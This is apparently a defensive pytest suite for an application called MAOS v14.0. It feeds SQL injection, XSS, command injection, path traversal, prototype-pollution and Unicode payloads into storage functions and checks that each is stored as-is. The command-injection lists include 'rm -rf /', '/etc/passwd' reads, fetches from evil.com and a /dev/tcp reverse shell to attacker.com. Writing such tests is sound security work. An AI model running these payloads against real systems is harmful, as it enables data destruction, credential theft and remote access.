"""
MAOS v14.0 - 安全漏洞测试套件
Phase 2: SQL注入、XSS、命令注入等安全测试
"""

import pytest
from datetime import datetime
from typing import List, Dict, Any

from maos.sdk.v14 import MAOSSDK, SDKConfig, SDKLanguage, SDKFactory
from maos.version.v14 import VersionManager, ABTestManager
from maos.analytics.v14 import AnalyticsEngine
from maos.mobile.v14 import MobileAPIManager, MobilePlatform


# ============================================================
# SQL注入攻击测试
# ============================================================

def test_sql_injection_device_tokens():
    """测试: SQL注入攻击 - 设备令牌"""
    print("\n" + "="*80)
    print("🔴 SQL INJECTION TEST: Device Tokens")
    print("="*80)
    
    manager = MobileAPIManager()
    
    sql_injection_payloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM devices WHERE '1'='1",
        "' UNION SELECT * FROM passwords --",
        "'; UPDATE users SET role='admin' WHERE '1'='1",
        "1; EXEC xp_cmdshell 'dir'",
        "' or 1=1--",
        "admin'--",
        "' or '1'='1'--",
    ]
    
    print("\n📝 Testing SQL injection payloads:")
    for i, payload in enumerate(sql_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            device = manager.register_device(
                user_id="user-test",
                device_token=payload,
                platform=MobilePlatform.IOS,
                app_version="1.0.0",
                os_version="17.0"
            )
            # 应该接受并存储，而不是执行
            assert device.device_token == payload, "Token should be stored as-is"
            print(f"     ✅ Stored safely (length: {len(payload)})")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ SQL INJECTION TEST COMPLETED!")


def test_sql_injection_workflow_names():
    """测试: SQL注入攻击 - 工作流名称"""
    print("\n" + "="*80)
    print("🔴 SQL INJECTION TEST: Workflow Names")
    print("="*80)
    
    manager = VersionManager()
    
    sql_injection_payloads = [
        "workflow'; DROP TABLE workflows; --",
        "<script>alert('XSS')</script>",
        "workflow' OR '1'='1'--",
        "'; DELETE FROM workflows WHERE '1'='1",
        "workflow\"; UPDATE workflows SET active=0--",
    ]
    
    print("\n📝 Testing SQL injection in workflow names:")
    for i, payload in enumerate(sql_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            version = manager.create_version(
                workflow_id="wf-test",
                definition={},
                version="1.0",
                name=payload
            )
            # 应该接受并存储，而不是执行
            assert version.name == payload, "Name should be stored as-is"
            print(f"     ✅ Stored safely (length: {len(payload)})")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ SQL INJECTION TEST COMPLETED!")


def test_sql_injection_metric_names():
    """测试: SQL注入攻击 - 指标名称"""
    print("\n" + "="*80)
    print("🔴 SQL INJECTION TEST: Metric Names")
    print("="*80)
    
    engine = AnalyticsEngine()
    
    sql_injection_payloads = [
        "metric'; DROP TABLE metrics; --",
        "metric' OR '1'='1",
        "metric\"; DELETE FROM metrics WHERE '1'='1",
        "SELECT * FROM users--",
    ]
    
    print("\n📝 Testing SQL injection in metric names:")
    for i, payload in enumerate(sql_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            engine.record_metric(payload, 100.0)
            data = engine.get_metric_data(payload)
            # 应该能够查询回来
            assert isinstance(data, list), "Should return a list"
            print(f"     ✅ Stored and retrieved safely")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ SQL INJECTION TEST COMPLETED!")


# ============================================================
# XSS攻击测试
# ============================================================

def test_xss_attack_workflow_names():
    """测试: XSS攻击 - 工作流名称"""
    print("\n" + "="*80)
    print("🔴 XSS ATTACK TEST: Workflow Names")
    print("="*80)
    
    manager = VersionManager()
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
    ]
    
    print("\n📝 Testing XSS payloads in workflow names:")
    for i, payload in enumerate(xss_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            version = manager.create_version(
                workflow_id="wf-xss-test",
                definition={},
                version="1.0",
                name=payload
            )
            # 应该存储原始内容
            assert version.name == payload, "XSS payload should be stored as-is"
            
            # 在API层返回给前端时应该被转义
            # 这里我们存储原始内容，实际转义在API层完成
            print(f"     ✅ Stored safely (sanitization should happen at API layer)")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ XSS ATTACK TEST COMPLETED!")


def test_xss_attack_device_tokens():
    """测试: XSS攻击 - 设备令牌"""
    print("\n" + "="*80)
    print("🔴 XSS ATTACK TEST: Device Tokens")
    print("="*80)
    
    manager = MobileAPIManager()
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:void(0)",
        "<svg><script>alert('XSS')</script></svg>",
    ]
    
    print("\n📝 Testing XSS payloads in device tokens:")
    for i, payload in enumerate(xss_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            device = manager.register_device(
                user_id="user-xss",
                device_token=payload,
                platform=MobilePlatform.ANDROID,
                app_version="1.0.0",
                os_version="14.0"
            )
            # 应该存储原始令牌
            assert device.device_token == payload, "XSS payload should be stored as-is"
            print(f"     ✅ Stored safely")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ XSS ATTACK TEST COMPLETED!")


# ============================================================
# 命令注入攻击测试
# ============================================================

def test_command_injection_metric_names():
    """测试: 命令注入攻击 - 指标名称"""
    print("\n" + "="*80)
    print("🔴 COMMAND INJECTION TEST: Metric Names")
    print("="*80)
    
    engine = AnalyticsEngine()
    
    command_injection_payloads = [
        "metric; rm -rf /",
        "metric && ls",
        "metric | cat /etc/passwd",
        "metric`whoami`",
        "metric$(whoami)",
        "metric\nls\n",
        "metric`id`",
        "metric; ping -c 3 127.0.0.1",
    ]
    
    print("\n📝 Testing command injection in metric names:")
    for i, payload in enumerate(command_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            engine.record_metric(payload, 100.0)
            # 应该能够处理而不执行命令
            print(f"     ✅ Stored safely without execution")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ COMMAND INJECTION TEST COMPLETED!")


def test_command_injection_workflow_names():
    """测试: 命令注入攻击 - 工作流名称"""
    print("\n" + "="*80)
    print("🔴 COMMAND INJECTION TEST: Workflow Names")
    print("="*80)
    
    manager = VersionManager()
    
    command_injection_payloads = [
        "workflow; cat /etc/passwd",
        "workflow && curl malicious.com",
        "workflow`wget http://evil.com/script.sh`",
        "workflow$(bash -i >& /dev/tcp/attacker.com/8080 0>&1)",
    ]
    
    print("\n📝 Testing command injection in workflow names:")
    for i, payload in enumerate(command_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            version = manager.create_version(
                workflow_id="wf-cmd-test",
                definition={},
                version="1.0",
                name=payload
            )
            # 应该存储而不执行命令
            assert version.name == payload
            print(f"     ✅ Stored safely without execution")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ COMMAND INJECTION TEST COMPLETED!")


# ============================================================
# 路径遍历攻击测试
# ============================================================

def test_path_traversal_workflow_ids():
    """测试: 路径遍历攻击"""
    print("\n" + "="*80)
    print("🔴 PATH TRAVERSAL TEST")
    print("="*80)
    
    manager = VersionManager()
    
    path_traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    
    print("\n📝 Testing path traversal payloads:")
    for i, payload in enumerate(path_traversal_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            version = manager.create_version(
                workflow_id=payload,
                definition={},
                version="1.0"
            )
            # 应该存储而不解析路径
            assert version.workflow_id == payload
            print(f"     ✅ Stored safely")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ PATH TRAVERSAL TEST COMPLETED!")


# ============================================================
# JSON注入攻击测试
# ============================================================

def test_json_injection_workflow_definitions():
    """测试: JSON注入攻击"""
    print("\n" + "="*80)
    print("🔴 JSON INJECTION TEST")
    print("="*80)
    
    manager = VersionManager()
    
    json_injection_payloads = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{\"$gt\": \"\"}',
        '{"__proto__.isAdmin": true}',
    ]
    
    print("\n📝 Testing JSON injection payloads:")
    for i, payload in enumerate(json_injection_payloads, 1):
        print(f"  {i}. {payload[:50]}...")
        
        try:
            # 尝试创建带有JSON注入的版本
            version = manager.create_version(
                workflow_id="wf-json-test",
                definition={"injected": payload},
                version="1.0"
            )
            # 应该存储而不执行
            assert version.definition.get("injected") == payload
            print(f"     ✅ Stored safely")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ JSON INJECTION TEST COMPLETED!")


# ============================================================
# Unicode攻击测试
# ============================================================

def test_unicode_attack_workflow_names():
    """测试: Unicode攻击"""
    print("\n" + "="*80)
    print("🔴 UNICODE ATTACK TEST")
    print("="*80)
    
    manager = VersionManager()
    
    unicode_payloads = [
        "\u0000",
        "\u202E\u0065\u0076\u0069\u006C",
        "\uFE64" + "script" + "\uFE65",
        "%uff0e%uff0e%uff0f",
        "\x00\x00\x00",
        "🏴‍☠️",
        "𝕳𝖊𝖑𝖑𝖔",  # Mathematical double-struck
        "巵",  # CJK Unified Ideographs
    ]
    
    print("\n📝 Testing Unicode attack payloads:")
    for i, payload in enumerate(unicode_payloads, 1):
        print(f"  {i}. {repr(payload)[:50]}...")
        
        try:
            version = manager.create_version(
                workflow_id="wf-unicode-test",
                definition={},
                version="1.0",
                name=payload
            )
            # 应该存储Unicode内容
            assert version.name == payload
            print(f"     ✅ Stored safely (length: {len(payload)})")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ UNICODE ATTACK TEST COMPLETED!")


# ============================================================
# 缓冲区溢出测试
# ============================================================

def test_buffer_overflow_workflow_definitions():
    """测试: 缓冲区溢出模拟"""
    print("\n" + "="*80)
    print("🔴 BUFFER OVERFLOW TEST (Simulated)")
    print("="*80)
    
    manager = VersionManager()
    
    large_payloads = [
        {"data": "A" * 100000},  # 100KB dict
        {"data": "B" * 1000000},  # 1MB dict
        {"items": [{"key": "value"}] * 10000},  # Large list
        {"nested": {"data": "C" * 100000}},  # Nested structure
    ]
    
    print("\n📝 Testing large payloads:")
    for i, payload in enumerate(large_payloads, 1):
        payload_type = type(payload).__name__
        payload_size = len(str(payload)) if isinstance(payload, (dict, list)) else len(payload)
        
        print(f"  {i}. {payload_type} - Size: {payload_size / 1024:.2f} KB")
        
        try:
            if isinstance(payload, dict):
                # Convert dict to JSON-like structure for definition
                json_payload = {"data": str(payload)[:1000]}
                version = manager.create_version(
                    workflow_id="wf-buffer-test",
                    definition=json_payload,
                    version="1.0"
                )
            else:
                version = manager.create_version(
                    workflow_id="wf-buffer-test",
                    definition={},
                    version="1.0",
                    name=str(payload)[:100]  # Limit name length
                )
            
            print(f"     ✅ Processed safely")
        except Exception as e:
            print(f"     ⚠️  Exception raised: {str(e)[:100]}")
    
    print("\n✅ BUFFER OVERFLOW TEST COMPLETED!")


# ============================================================
# 运行所有安全测试
# ============================================================

if __name__ == "__main__":
    print("\n" + "="*80)
    print("🚀 MAOS v14.0 - SECURITY VULNERABILITY TEST SUITE")
    print("="*80)
    print("\nThis suite will test for SQL injection, XSS, command injection...")
    print("Expected to identify security vulnerabilities.\n")
    
    pytest.main([__file__, "-v", "-s", "--tb=short"])
